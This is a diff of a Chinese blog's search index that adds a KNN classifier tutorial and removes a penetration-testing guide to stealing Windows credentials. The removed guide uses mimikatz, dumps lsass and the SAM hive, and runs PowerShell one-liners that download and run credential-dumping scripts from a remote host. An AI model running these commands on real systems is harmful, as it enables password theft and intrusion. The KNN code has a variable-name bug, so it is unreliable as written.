mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
+c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
+c340,-704.7,510.7,-1060.3,512,-1067
+l0 -0
+c4.7,-7.3,11,-11,19,-11
+H40000v40H1012.3
+s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
+c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
+s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
+c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
+M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">4</span><span class="mord">9</span><span class="mord">8</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">2</span><span class="mord">1</span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.30499999999999994em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord">6</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">8</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
+c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
+c340,-704.7,510.7,-1060.3,512,-1067
+l0 -0
+c4.7,-7.3,11,-11,19,-11
+H40000v40H1012.3
+s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
+c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
+s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
+c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
+M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">.</span><span class="mord">8</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span></span><span class="mspace newline"></span></span></span>
+
+<p>这样，将上面计算结果进行排序，可以得到,取<code>K = 3</code></p>
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>3</mn></msub><mi mathvariant="normal">∣</mi><mo>&lt;</mo><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>4</mn></msub><mi mathvariant="normal">∣</mi><mo>&lt;</mo><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>&lt;</mo><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex"> 
+
+|AB_3|&lt;|AB_4|&lt;|AB_2|&lt;|AB_1|
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span>
+
+<p>那么可以知道前三个有两个项目时成功的，一个是失败的，由于少数服从多数得出我们项目五也是成功</p>
+<h3 id="0x02-算法步骤"><a href="#0x02-算法步骤" class="headerlink" title="0x02 算法步骤"></a>0x02 算法步骤</h3><ul>
+<li><p>准备训练数据和测试数据；</p>
 </li>
-<li><p>网络认证：远程连接到工作组中的某个设备 </p>
+<li><p>确定参数 k；</p>
 </li>
-<li><p>域认证：登陆到域环境中的某个设备</p>
+<li><p>计算测试数据与各个训练数据之间的距离，距离的递增关系进行排序；</p>
+</li>
+<li><p>选取距离最小的 k 个点；</p>
+</li>
+<li><p>确定前 k 个点所在类别的出现频率；</p>
+</li>
+<li><p>返回前 k 个点中出现频率最高的类别作为测试数据的预测分类。</p>
 </li>
 </ul>
-<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
-<li><p>用户输入密码 </p>
-</li>
-<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
-</li>
-<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
-</li>
-<li><p>匹配则登陆成功，不匹配则登陆失败</p>
-</li>
-</ul>
-<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
-<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
-<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
-</blockquote>
-<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x03-代码实现"><a href="#0x03-代码实现" class="headerlink" title="0x03 代码实现"></a>0x03 代码实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify</span>(<span class="params">inX,dataSet,label,k</span>):</span></span><br><span class="line">    dataSetSize = array(dataSet).shape[<span class="number">0</span>]</span><br><span class="line">    diffMat = tile(inX,(dataSetSize,<span class="number">1</span>)) - dataSet</span><br><span class="line">    sqDiffMat = diffMat**<span class="number">2</span></span><br><span class="line">    sqDistances = sqDiffMat.<span class="built_in">sum</span>(axis=<span class="number">1</span>)</span><br><span class="line">    distances = sqDistances**<span class="number">0.5</span></span><br><span class="line">    sortedDistIndicies = distances.argsort()</span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        votellabel = labels[sortedDistIndicies[i]]</span><br><span class="line">        classCount[votellabel] =classCount.get(votellabel,<span class="number">0</span>) +<span class="number">1</span></span><br><span class="line">    sortClassCount = <span class="built_in">sorted</span>(classCount.items(),key=operator.itemgetter(<span class="number">1</span>),reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
 
-<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
-
-<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
-<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
-
-<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
-<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
-<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
-<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
-</blockquote>
-<p>Procdump lsass 进程导出: </p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p>然后使用mimikatz还原密码：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
-
-<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
-
-<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
-<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
-</blockquote>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
-<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
-
-<p>获取hash值</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
-<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
-</blockquote>
-<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
-<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
-<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
-<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
-<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
-</blockquote>
-<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
-<p>查看本地用户此目录下是否存有RDP密码文件：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
-<p>查看保存在本地的远程主机信息：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
-
-<p>选择一个密码文件对其进行解密：</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
-
-<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据guidMasterKey找到对应的Masterkey：</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
-
-<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
-
-<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
-<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
-<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
-<ul>
-<li>“.frm” 是描述表结构的文件 </li>
-<li>“.MYD” 是表的数据文件 </li>
-<li>“.MYI” 是表数据文件中任何索引的数据树</li>
-</ul>
-<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
-<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
-<ul>
-<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
-<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
-</ul>
-<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
-<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
-<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
-<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
-<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
-</ul>
-<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
+<h3 id="0x04-KNN的优缺点"><a href="#0x04-KNN的优缺点" class="headerlink" title="0x04 KNN的优缺点"></a>0x04 KNN的优缺点</h3><h4 id="1-优点"><a href="#1-优点" class="headerlink" title="1. 优点"></a>1. 优点</h4><ol>
+<li>KNN模型容易理解，不需要过多调节就能得到不错的性能</li>
+<li>时间复杂度低</li>
+<li>可适用于多分类问题</li>
+<li>新数据可以直接加入数据集，不需要重新训练</li>
+</ol>
+<h4 id="2-缺点"><a href="#2-缺点" class="headerlink" title="2. 缺点"></a>2. 缺点</h4><ol>
+<li>计算量大，每一次需要和所有样本进行比较，空间复杂度高</li>
+<li>受K值选取的影响</li>
+<li>样本不平衡的时候，对于西游样本预测的准确率低</li>
+<li>对训练的数据依赖性大</li>
+</ol>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>机器学习</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>KNN</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -613,6 +600,194 @@
 
 <p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png"></p>
 <p>成功提权</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
